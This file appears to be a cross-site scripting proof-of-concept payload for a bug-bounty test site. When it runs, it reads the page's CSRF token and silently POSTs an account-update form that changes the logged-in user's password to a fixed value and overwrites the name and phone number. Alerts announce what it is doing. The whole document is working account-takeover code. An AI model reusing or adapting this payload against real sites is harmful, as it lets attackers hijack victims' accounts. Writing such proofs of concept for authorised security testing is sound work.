alert(document.domain + " it's will set a new password to your account,If you have been logined.");
var inputDisplay1 = document.querySelector('.input-display');
var text1 = inputDisplay1?.textContent.trim();
var email1 = text1?.split('\n')[0].trim();
alert("Your email account is " + email1 + " will be set a new password.");


 // 查找包含csrf_token的input元素
var csrfTokenElement1 = window.csrfToken;
if (csrfTokenElement1) {
    var formData1 = new URLSearchParams();
    formData1.append('password', 'SetANewPassword');
    formData1.append('passwordConfirm', 'SetANewPassword');
    formData1.append('first', 'attacker');
    formData1.append('last', 'you');
    formData1.append('phone', '(760) 278-1253');
    formData1.append('optedIntoTransactionalTexts', 'true');
    formData1.append('_optedIntoTransactionalTexts', 'on');
    formData1.append('_optedIntoMarketingTexts', 'on');
    formData1.append('birthday', '');
    formData1.append('birthdayMonth', '');
    formData1.append('birthdayDate', '');
    formData1.append('_csrf', csrfTokenElement1);
    formData1.append('myaccount', 'Save changes');
            
    // 发送 POST 请求（不处理返回数据）
    fetch('https://bugbounty-secure.dctest.donorschoose.org/common/private-info.html', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/x-www-form-urlencoded',
      },
      body: formData1.toString()
    })
    .catch(error => {
      console.error('Request failed:', error);
    });
}

